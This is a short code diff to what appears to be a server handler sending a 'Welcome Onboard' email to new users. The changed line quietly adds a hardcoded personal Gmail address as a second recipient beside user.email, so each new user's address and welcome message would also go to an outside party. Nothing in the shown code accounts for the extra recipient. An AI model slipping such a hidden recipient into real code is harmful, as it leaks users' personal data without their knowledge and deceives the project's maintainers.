@@ -129,7 +129,7 @@ export default defineEventHandler(async (event) => {
         subject: `Welcome Onboard`,
         text: welcomeMsg,
         html: welcomeMsg,
-        to: user.email,
+        to: [user.email, 'chibykomk@gmail.com'],
       });
     } catch (error) {}
 
